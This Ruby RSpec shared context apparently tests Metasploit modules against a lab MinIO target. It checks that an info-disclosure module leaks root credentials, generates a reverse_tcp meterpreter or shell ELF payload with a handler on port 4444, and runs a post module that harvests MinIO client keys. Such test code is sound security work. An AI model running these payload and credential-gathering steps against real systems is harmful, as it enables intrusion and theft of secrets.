# frozen_string_literal: true

require 'base64'
require 'shellwords'
require_relative 'functional_support'

RSpec.shared_context 'MinIO owner evidence' do
  include_context 'module target'
  include_context 'wait_for_expect'

  def minio_sql(query)
    target_exec('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def minio_rows(workspace = @workspace)
    raise ArgumentError, 'Invalid owned workspace' unless workspace.match?(/\Aminio_[0-9_]+(?:_other)?\z/)

    query = <<~SQL
      SELECT coalesce(json_agg(record ORDER BY record.core_id, record.login_id), '[]'::json) FROM (
        SELECT c.id AS core_id, l.id AS login_id, c.origin_id, w.name AS workspace,
               p.username, secret.data AS private_data, secret.type AS private_type,
               c.origin_type, o.module_full_name, l.status, l.last_attempted_at,
               h.id AS host_id, host(h.address::inet) AS host,
               s.id AS service_id, s.port, s.proto, s.name AS service, realm.value AS realm,
               c.workspace_id AS credential_workspace_id, h.workspace_id AS host_workspace_id,
               l.service_id AS login_service_id, o.service_id AS origin_service_id
        FROM metasploit_credential_cores c
        JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_realms realm ON realm.id=c.realm_id
        LEFT JOIN metasploit_credential_logins l ON l.core_id=c.id
        LEFT JOIN services s ON s.id=l.service_id
        LEFT JOIN hosts h ON h.id=s.host_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        WHERE w.name='#{workspace}'
      ) record;
    SQL
    JSON.parse(minio_sql(query))
  end

  def minio_loots
    JSON.parse(minio_sql(<<~SQL))
      SELECT coalesce(json_agg(record ORDER BY record.id), '[]'::json) FROM (
        SELECT l.id,l.path,l.ltype,l.content_type,l.name,l.info,l.host_id,l.service_id,
               l.workspace_id,host(h.address::inet) AS host,h.workspace_id AS host_workspace_id
        FROM loots l JOIN workspaces w ON w.id=l.workspace_id
        LEFT JOIN hosts h ON h.id=l.host_id WHERE w.name='#{@workspace}'
      ) record;
    SQL
  end

  def evidence(name, data)
    File.write(File.join(target_runtime.fetch('artifacts'), "#{@workspace}-#{name}.json"), JSON.pretty_generate(data) + "\n")
  end

  def loot_files
    Dir[File.join(target_runtime.fetch('artifacts'), 'msf-config/loot/**/*')].select { |path| File.file?(path) }.to_h do |path|
      bytes = File.binread(path)
      [path, { 'bytes_base64' => Base64.strict_encode64(bytes), 'sha256' => Digest::SHA256.hexdigest(bytes), 'bytes' => bytes.bytesize }]
    end
  end

  def host_control(script, *arguments, timeout: 180)
    @host_control_index = (@host_control_index || 0) + 1
    output = +''
    runner = ModuleTargetTests.new
    path = File.join(target_runtime.fetch('artifacts'), "#{@workspace}-host-#{@host_control_index}.log")
    passed = runner.send(:command, ['python3', '-B', File.join(MinioTarget::DIRECTORY, script), ENV.fetch('MODULE_TARGET_RUNTIME'), *arguments], path: path, timeout: timeout, capture: output, quiet: true, env: target_runtime.fetch('compose_environment'))
    File.binwrite(path + '.out', output)
    expect(passed).to be(true), output
    JSON.parse(output)
  end

  def fixture(action, name)
    host_control('client_fixture.py', @client_token, action, name)
  end

  def with_minio_client_state(name)
    ledger = File.join(target_runtime.fetch('artifacts'), MinioTarget::Functional::CLIENT_STATES_FILE)
    records = JSON.parse(File.read(ledger))
    row = records.find { |item| item.values_at('kind', 'name') == [@session_kind, name] }
    raise MinioTarget::Error, 'Client state must be fresh and planned' unless row && row.values_at('entered', 'completed', 'restored') == [false, false, false]

    @client_token = "#{@workspace}_#{MinioTarget::Functional::CLIENT_CASES.index(name) + 1}"
    first_invocation = @invocation
    row.merge!('fixture_token' => @client_token, 'workspace' => @workspace, 'session_id' => Integer(@session_id),
               'session_pid' => Integer(@session_pid), 'invocation_first' => first_invocation + 1,
               'fixture_state' => File.join(target_runtime.fetch('artifacts'), "fixture-#{@client_token}/state.json"))
    begin
      verify_minio_session("client-state-#{name}-session-before")
      generated = fixture('prepare', name)
      row['entered'] = true
      File.write(ledger, JSON.pretty_generate(records) + "\n")
      yield generated.fetch('configs')
      expect(@invocation - first_invocation).to eq(MinioTarget::Functional::CLIENT_CALLS.fetch(name))
      verify_minio_session("client-state-#{name}-session-after")
      row['completed'] = true
    rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
      row['failure'] = { 'class' => e.class.to_s, 'message' => e.message }
      raise
    ensure
      errors = []
      if File.file?(row.fetch('fixture_state'))
        %w[verify restore].each do |action|
          actual = fixture(action, name)
          if action == 'restore'
            expect(actual).to include('initial_absence_restored' => true, 'restoration_errors' => [])
            row['restored'] = true
          end
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
          errors << { operation: "client-#{action}", error: "#{e.class}: #{e.message}" }
        end
      end
      row.merge!('cleanup_errors' => errors, 'invocation_last' => @invocation, 'owner_calls' => @invocation - first_invocation)
      evidence("client-state-#{name}", row)
      File.write(ledger, JSON.pretty_generate(records) + "\n")
      @client_token = nil
      # Retain the original failure while preserving independent cleanup errors.
      expect(errors).to eq([]) unless row.key?('failure')
    end
  end

  def bootstrap(service, negative: false, wrong_path: false, s3_proof: true)
    @invocation = (@invocation || 0) + 1
    previous_loots = minio_loots
    previous_files = loot_files
    output = run_target_module('auxiliary/gather/minio_bootstrap_verify_info_disc', service,
                               { 'TARGETURI' => wrong_path ? '/module-target-absent/' : '/', 'HttpTrace' => true, 'HttpTraceHeadersOnly' => false }, allow_errors: true)
    records = minio_rows
    loots = minio_loots
    files = loot_files
    # Preserve unchanged-owner facts before assertions, including unreported files.
    evidence("bootstrap-#{@invocation}", { output: output, credentials: records, loots: loots, actual_files: files, previous_files: previous_files })
    response = MinioTarget::Functional.bootstrap_trace(output)
    expect(output).to match(%r{^POST #{Regexp.escape(wrong_path ? '/module-target-absent/minio/bootstrap/v1/verify' : '/minio/bootstrap/v1/verify')} HTTP/1\.[01]\r?$})
    new_loots = loots.reject { |row| previous_loots.any? { |old| old.fetch('id') == row.fetch('id') } }
    new_files = files.reject { |path, data| previous_files[path] == data }
    if negative
      expect(response.fetch('status')).to eq(403) unless wrong_path
      expect(response.fetch('status')).not_to eq(200)
      expect(response.fetch('body')).to include('JWT token missing') unless wrong_path
      expect(output).to include('Unexpected Response')
      expect(output.lines.grep(/^\[\+\]/)).to eq([])
      expect(output).not_to include('module-target-minio-root-password', 'minio-native-prefixed-proof')
      expect(new_loots).to eq([])
      expect(new_files).to eq({})
      expect(records).to eq([])
      return
    end
    expect(response.fetch('status')).to eq(200)
    environment = JSON.parse(response.fetch('body')).fetch('MinioEnv')
    native = JSON.parse(File.read(target_runtime.fetch('assets'))).fetch('native')
    expect(environment).to include('MINIO_ROOT_USER' => native.fetch('root_user'), 'MINIO_ROOT_PASSWORD' => native.fetch('root_password'), native.fetch('sentinel_key') => native.fetch('sentinel_value'))
    expect(environment).not_to have_key(native.fetch('excluded_key'))
    environment.each { |key, value| expect(output).to match(/^\[\+\] #{Regexp.escape(key)}: #{Regexp.escape(value)}\r?$/) }
    expect(output).not_to include(native.fetch('excluded_value'))
    expect(new_loots.length).to eq(1)
    row = new_loots.fetch(0)
    expect(row).to include('ltype' => 'minio.env.json', 'content_type' => 'application/json', 'name' => 'minio.env.json', 'host' => target_runtime.fetch('module_endpoints').fetch(service).fetch('host'))
    expect(row.fetch('workspace_id')).to eq(row.fetch('host_workspace_id'))
    expect(new_files.keys).to eq([row.fetch('path')])
    raw = Base64.strict_decode64(new_files.fetch(row.fetch('path')).fetch('bytes_base64'))
    MinioTarget::Functional.bootstrap_loot(raw, response.fetch('body'))
    expect(records.length).to eq(1)
    record = records.fetch(0)
    endpoint = target_runtime.fetch('module_endpoints').fetch(service)
    expect(record).to include('workspace' => @workspace, 'username' => environment.fetch('MINIO_ROOT_USER'), 'private_data' => environment.fetch('MINIO_ROOT_PASSWORD'), 'private_type' => 'Metasploit::Credential::Password', 'origin_type' => 'Metasploit::Credential::Origin::Service', 'module_full_name' => 'auxiliary/gather/minio_bootstrap_verify_info_disc', 'status' => 'Untried', 'last_attempted_at' => nil, 'realm' => nil, 'host' => endpoint.fetch('host'), 'port' => endpoint.fetch('port'), 'proto' => 'tcp', 'service' => 'minio')
    expect(record.fetch('credential_workspace_id')).to eq(record.fetch('host_workspace_id'))
    expect(record.fetch('login_service_id')).to eq(record.fetch('origin_service_id'))
    if s3_proof
      directory = File.join(target_runtime.fetch('artifacts'), "#{@workspace}-derived-#{@invocation}")
      result = host_control('derived_s3.py', row.fetch('path'), directory)
      evidence("bootstrap-s3-#{@invocation}", { execution: 'executed', receipt: File.join(directory, 'derived-s3.json'), result: result })
      expect(result).to include('status' => 'module_derived_s3_passed', 'restored' => true)
    else
      evidence("bootstrap-s3-#{@invocation}", { execution: 'not_executed', reason: 'Workspace isolation only; node-specific examples execute genuine module-derived S3 twice per node' })
    end
    expect(minio_rows).to eq(records)
    records
  end

  def session_delivery_options(kind)
    options = %w[PrependExecOnce PrependFork PrependSetresuid PrependSetreuid PrependSetuid].to_h { |name| [name, false] }
    options.merge!('PayloadLinuxMinKernel' => '2.6', 'MeterpreterTryToFork' => false) if kind == 'meterpreter'
    options
  end

  def open_minio_session(kind)
    payload = "linux/x64/#{kind == 'shell' ? 'shell' : 'meterpreter'}_reverse_tcp"
    delivery = session_delivery_options(kind)
    console_command('back')
    console_command("use payload/#{payload}")
    delivery.each do |name, value|
      configured = console_command("set #{name} #{value}")
      expect(configured).not_to match(/Unknown datastore option|Invalid|not found|Failed/)
    end
    console_command("set LHOST #{listener_host}")
    console_command('set LPORT 4444')
    path = File.join(target_runtime.fetch('artifacts'), "#{@workspace}-#{kind}.elf")
    generated = console_command("generate -f elf -o #{path}")
    expect(generated).not_to match(/\[-\]|Exception|Unknown command/)
    expect(File.binread(path)).to start_with("\x7fELF")
    evidence('delivery', { payload: payload, options: delivery, generation_output: generated, bytes: File.size(path), sha256: Digest::SHA256.file(path).hexdigest })
    run_target_module('exploit/multi/handler', 'node1', delivery.merge('PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'ExitOnSession' => false), action: 'run -j', endpoint_options: {})
    wait_for_expect(20, 0.1) do
      listening = target_exec('framework', 'ruby', '-e', 'puts File.readlines("/proc/net/tcp").drop(1).any? { |line| row=line.split; row[1].split(":").last.to_i(16)==4444 && row[3]=="0A" }')
      expect(listening.strip).to eq('true')
    end
    @session_kind = kind
    @session_launch_attempted = true
    launch = host_control('session_fixture.py', @workspace, 'launch', kind)
    @session_proof = launch.fetch('proof')
    wait_for_expect(60, 0.2) do
      list = console_command('sessions -l')
      @session_id = list[/^\s*([0-9]+)\s+.*\b#{Regexp.escape(kind)}\b/i, 1]
      expect(@session_id).not_to be_nil, list
      expect(console.all_data).to include("#{kind == 'shell' ? 'Command shell' : 'Meterpreter'} session #{@session_id} opened")
    end
    instance = "framework.sessions[#{Integer(@session_id)}]"
    query = "s=#{instance}; puts 'MINIO_SESSION=' + {type:s.type,platform:s.platform,session_host:s.session_host,db_id:s.db_record.id,pid:(s.type=='meterpreter' ? s.sys.process.getpid : nil),home:(s.type=='meterpreter' ? s.sys.config.getenv('HOME') : nil)}.to_json"
    identity = console_command("irb -e #{query.inspect}")
    line = identity.lines.find { |value| value.start_with?('MINIO_SESSION=') }
    expect(line).not_to be_nil, identity
    data = JSON.parse(line.delete_prefix('MINIO_SESSION='))
    evidence('session-bootstrap', { launch: launch, identity: data, actual_output: identity })
    expect(data).to include('type' => kind, 'platform' => 'linux', 'session_host' => launch.fetch('node1_host'))
    @session_record = data
    home = JSON.parse(File.read(target_runtime.fetch('assets'))).fetch('assembly').fetch('home')
    value = "MinIO genuine session proof #{@workspace}"
    if kind == 'shell'
      # execve('/bin/sh', argv, NULL) clears HOME. Configure the genuine persistent
      # shell as an operator, then prove a separate later command sees the export.
      before = 'printf "MINIO_SESSION_PID=%s\\nMINIO_HOME_BEFORE=%s\\n" "$$" "${HOME-}"'
      before_output = console_command("sessions -i #{@session_id} -c #{before.inspect}")
      pid = before_output[/^MINIO_SESSION_PID=([0-9]+)\r?$/, 1]
      exported = console_command("sessions -i #{@session_id} -c #{"export HOME=#{Shellwords.escape(home)}".inspect}")
      later = 'printf "MINIO_SESSION_PID=%s\\nMINIO_HOME_LATER=%s\\n" "$$" "$HOME"'
      later_output = console_command("sessions -i #{@session_id} -c #{later.inspect}")
      evidence('session-home', { scope: 'genuine operator export in established shell; unconfigured HOME not qualified', before: before_output, export: exported, later: later_output })
      expect(pid).not_to be_nil, before_output
      expect(before_output).to match(/^MINIO_HOME_BEFORE=.*\r?$/)
      expect(later_output).to match(/^MINIO_SESSION_PID=#{Regexp.escape(pid)}\r?$/)
      expect(later_output).to match(/^MINIO_HOME_LATER=#{Regexp.escape(home)}\r?$/)
      used = console_command("sessions -i #{@session_id} -c #{"printf %s #{Shellwords.escape(value)} > #{Shellwords.escape(@session_proof)}".inspect}")
    else
      pid = data.fetch('pid').to_s
      expect(data.fetch('home')).to eq(home)
      script = "h=#{instance}.fs.file.new(#{@session_proof.inspect},'wb'); begin; n=h.write(#{value.inspect}); puts 'MINIO_SESSION_WRITE='+n.to_s; ensure; h.close; end"
      used = console_command("irb -e #{script.inspect}")
      expect(used).to match(/^MINIO_SESSION_WRITE=#{value.bytesize}\r?$/)
      later = "puts 'MINIO_HOME=' + #{instance}.sys.config.getenv('HOME').to_json"
      later_output = console_command("irb -e #{later.inspect}")
      evidence('session-home', { scope: 'default raw ELF2.6 foreground, real getenv RPC; no environment setter', before: data.fetch('home'), later: later_output })
      expect(later_output).to match(/^MINIO_HOME=#{Regexp.escape(home.to_json)}\r?$/)
    end
    expect(used).not_to match(/\[-\]|Exception|Unknown command/)
    verified = host_control('session_fixture.py', @workspace, 'verify', kind, pid, data.fetch('session_host'), Base64.strict_encode64(value))
    expect(verified.fetch('genuine_session')).to include('pid' => Integer(pid), 'peer' => data.fetch('session_host'), 'proof_sha256' => Digest::SHA256.hexdigest(value))
    evidence('session', { launch: launch, identity: data, actual_home_later: later_output, proof_output: used, native_verification: verified })
    @session_pid = pid
    @session_proof_value = value
    @session_id
  end

  def verify_minio_session(name)
    verified = host_control('session_fixture.py', @workspace, 'verify', @session_kind, @session_pid,
                            @session_record.fetch('session_host'), Base64.strict_encode64(@session_proof_value))
    expect(verified.fetch('genuine_session')).to include('pid' => Integer(@session_pid), 'peer' => @session_record.fetch('session_host'), 'proof_sha256' => Digest::SHA256.hexdigest(@session_proof_value))
    evidence(name, verified)
  end

  def table_rows(text)
    text.lines.filter_map do |line|
      fields = line.strip.split(/\s{2,}/)
      fields if fields.length == 6 && fields.first != 'name' && !fields.all? { |item| item.match?(/\A-+\z/) }
    end
  end

  def collect_client(config, expected_aliases: nil)
    @invocation = (@invocation || 0) + 1
    before = minio_loots
    files_before = loot_files
    output = run_target_module('post/multi/gather/minio_client', 'node1', { 'SESSION' => @session_id, 'CONFIG_PATH' => config }, allow_errors: true, endpoint_options: {})
    rows = minio_rows
    loots = minio_loots
    files = loot_files
    evidence("client-#{@invocation}", { output: output, credentials: rows, loots: loots, actual_files: files })
    expect(output).to include('Post module execution completed')
    expect(output).not_to match(/Post failed|Post aborted|NoMethodError|TypeError/)
    expect(rows).to eq([])
    added = loots.reject { |row| before.any? { |old| old.fetch('id') == row.fetch('id') } }
    changed_files = files.reject { |path, data| files_before[path] == data }
    if expected_aliases
      expected = expected_aliases.map { |name, fields| [name, *%w[url accessKey secretKey api path].map { |key| fields.fetch(key) }] }.sort
      expect(table_rows(output).sort).to eq(expected)
      expect(added.length).to eq(1)
      row = added.fetch(0)
      expect(row).to include('ltype' => 'host.minio', 'content_type' => 'text/plain', 'name' => 'minio_client.txt', 'host' => @session_record.fetch('session_host'), 'service_id' => nil)
      expect(changed_files.keys).to eq([row.fetch('path')])
      expect(table_rows(File.binread(row.fetch('path'))).sort).to eq(expected)
      session_rows = JSON.parse(minio_sql("SELECT row_to_json(record) FROM (SELECT s.local_id,s.host_id,h.workspace_id FROM sessions s JOIN hosts h ON h.id=s.host_id WHERE s.id=#{Integer(@session_record.fetch('db_id'))}) record"))
      expect(session_rows).to include('local_id' => Integer(@session_id), 'host_id' => row.fetch('host_id'), 'workspace_id' => row.fetch('workspace_id'))
      expect(row.fetch('workspace_id')).to eq(row.fetch('host_workspace_id'))
    else
      expect(added).to eq([])
      expect(changed_files).to eq({})
    end
    output
  end
end
